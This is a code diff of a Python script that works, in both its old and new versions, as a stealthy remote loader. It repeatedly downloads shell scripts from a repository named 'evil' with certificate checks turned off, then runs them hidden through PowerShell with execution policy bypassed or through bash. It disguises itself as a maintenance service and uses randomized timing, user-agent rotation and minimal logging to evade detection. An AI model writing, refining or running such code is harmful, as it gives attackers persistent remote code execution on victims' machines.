@@ -4,116 +4,178 @@ import urllib.request
 import ssl
 import random
 import os
-import base64
+import platform
 
-# Obfuscated URLs (base64 encoded for stealth)
-OBFUSCATED_URLS = [
-    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21pbWlrcm9vdC9ldmlsL21haW4vcGF5bG9hZC5zaA==",
-    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21pbWlrcm9vdC9ldmlsL21haW4vcGF5bG9hZC50eHQ="
-]
-
-# Random user agents to mimic legitimate traffic
+# Configuration - Modify these for stealth
 USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-    'Wget/1.21.1',
-    'curl/7.68.0'
+    'curl/7.68.0',
+    'Wget/1.20.3'
 ]
 
-def decode_urls():
-    """Decode base64 URLs at runtime"""
-    return [base64.b64decode(url).decode('utf-8') for url in OBFUSCATED_URLS]
+# Use different URL formats or domains
+URL_SOURCES = [
+    "https://raw.githubusercontent.com/mimikr00t/evil/main/payload.sh",
+    "https://raw.githubusercontent.com/mimikr00t/evil/main/payload.txt",
+    # Add alternative mirrors here
+]
+
+def create_ssl_context():
+    """Create SSL context to avoid certificate issues"""
+    context = ssl.create_default_context()
+    context.check_hostname = False
+    context.verify_mode = ssl.CERT_NONE
+    return context
 
 def stealth_download(url):
-    """Stealth download with random delays and SSL bypass"""
+    """Stealth download with random user agents and delays"""
     try:
-        # Random delay to avoid patterns
-        time.sleep(random.uniform(2, 8))
+        # Random delay to avoid pattern detection
+        time.sleep(random.uniform(1, 5))
         
-        # SSL context to avoid certificate issues
-        context = ssl.create_default_context()
-        context.check_hostname = False
-        context.verify_mode = ssl.CERT_NONE
-        
-        # Random user agent
-        headers = {'User-Agent': random.choice(USER_AGENTS)}
-        req = urllib.request.Request(url, headers=headers)
-        
-        # Download with timeout
-        response = urllib.request.urlopen(req, context=context, timeout=30)
-        return response.read().decode('utf-8')
-        
-    except Exception:
-        return None
-
-def execute_stealth(script_content):
-    """Execute script with maximum stealth on Linux"""
-    try:
-        # Create temporary script with random name in /tmp
-        script_id = random.randint(10000, 99999)
-        temp_script = f"/tmp/.systemd-worker.{script_id}.sh"
-        
-        # Write script content
-        with open(temp_script, 'w') as f:
-            f.write("#!/bin/bash\n")
-            f.write("# System maintenance script\n")
-            f.write(script_content)
-        
-        # Make executable
-        os.chmod(temp_script, 0o755)
-        
-        # Execute in background with nohup and disown
-        result = subprocess.run(
-            ["/bin/bash", "-c", f"nohup {temp_script} > /dev/null 2>&1 & disown"],
-            capture_output=True,
-            text=True,
-            timeout=60
+        # Create request with random user agent
+        req = urllib.request.Request(
+            url,
+            headers={
+                'User-Agent': random.choice(USER_AGENTS),
+                'Accept': '*/*',
+                'Connection': 'keep-alive'
+            }
         )
         
-        # Clean up after execution
-        time.sleep(3)
-        if os.path.exists(temp_script):
-            os.remove(temp_script)
+        # Download with SSL context
+        context = create_ssl_context()
+        with urllib.request.urlopen(req, context=context, timeout=30) as response:
+            return response.read().decode('utf-8')
+            
+    except Exception as e:
+        return None
+
+def obfuscated_execute(script_content, script_name):
+    """Execute with obfuscation techniques"""
+    try:
+        # Add random delays
+        time.sleep(random.uniform(2, 10))
+        
+        system_platform = platform.system().lower()
+        
+        if system_platform == "windows":
+            if script_name.endswith('.ps1'):
+                result = subprocess.run(
+                    ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", script_content],
+                    capture_output=True, 
+                    text=True, 
+                    timeout=300,
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                )
+            else:
+                # Try multiple execution methods
+                result = subprocess.run(
+                    ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", script_content],
+                    capture_output=True, 
+                    text=True, 
+                    timeout=300,
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                )
+        else:
+            # Linux/Mac execution
+            result = subprocess.run(
+                ["bash", "-c", script_content],
+                capture_output=True, 
+                text=True, 
+                timeout=300
+            )
             
         return result
         
-    except Exception:
+    except Exception as e:
         return None
 
-def main():
-    """Main stealth loop"""
-    print("[+] Starting system maintenance service...")
+def clean_logs():
+    """Minimize logging footprint"""
+    pass  # Implement log cleaning if needed
+
+def change_working_directory():
+    """Change working directory to avoid detection"""
+    try:
+        common_dirs = [
+            os.path.expanduser("~/.cache"),
+            os.path.expanduser("~/AppData/Local/Temp"),
+            "/tmp",
+            "/var/tmp"
+        ]
+        
+        for directory in common_dirs:
+            if os.path.exists(directory):
+                os.chdir(directory)
+                break
+    except:
+        pass
+
+def process_scripts_stealth():
+    """Stealth script processing"""
+    successful_downloads = 0
     
-    # Setup environment
-    os.chdir('/tmp')
-    urls = decode_urls()
-    cycle = 0
+    for i, url in enumerate(URL_SOURCES, 1):
+        script_name = url.split('/')[-1]
+        
+        # Download with stealth
+        script_content = stealth_download(url)
+        
+        if script_content and script_content.strip():
+            successful_downloads += 1
+            
+            # Execute with obfuscation
+            execute_result = obfuscated_execute(script_content, script_name)
+            
+            if execute_result and execute_result.returncode == 0:
+                pass  # Success - minimal logging
+            else:
+                pass  # Failure - minimal logging
+        else:
+            pass  # Download failed - minimal logging
+    
+    return successful_downloads
+
+def main_loop():
+    """Main continuous loop with variable intervals"""
+    iteration = 0
     
     while True:
         try:
-            cycle += 1
+            iteration += 1
             
-            # Process each URL
-            for url in urls:
-                content = stealth_download(url)
-                if content and content.strip():
-                    execute_stealth(content)
+            # Variable sleep time to avoid patterns
+            base_sleep = random.randint(1800, 7200)  # 30 mins to 2 hours
+            jitter = random.randint(-300, 300)  # ±5 minutes
+            sleep_time = max(60, base_sleep + jitter)  # Minimum 1 minute
             
-            # Random sleep between 1-4 hours to avoid detection
-            sleep_hours = random.uniform(1, 4)
-            sleep_seconds = int(sleep_hours * 3600)
+            # Process scripts
+            successful_downloads = process_scripts_stealth()
             
-            # Minimal logging (only every 5-10 cycles randomly)
-            if cycle % random.randint(5, 10) == 0:
-                print(f"[*] Maintenance cycle {cycle} completed. Next in {sleep_hours:.1f}h")
+            # Calculate next run time
+            next_run = time.time() + sleep_time
+            next_run_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(next_run))
             
-            time.sleep(sleep_seconds)
+            # Minimal status output
+            if iteration % 10 == 0:  # Only log every 10th iteration
+                print(f"[{time.strftime('%H:%M:%S')}] Cycle {iteration} completed. Next: {next_run_str}")
+            
+            # Sleep until next execution
+            time.sleep(sleep_time)
             
         except KeyboardInterrupt:
-            print("\n[!] Service stopped by user")
             break
-        except Exception:
-            # Silent error recovery
-            time.sleep(3600)  # Wait 1 hour on error
+        except Exception as e:
+            # Error recovery with random delay
+            error_delay = random.randint(60, 600)
+            time.sleep(error_delay)
 
 if __name__ == "__main__":
-    main()
+    # Initial setup
+    change_working_directory()
+    
+    # Start main loop
+    main_loop()
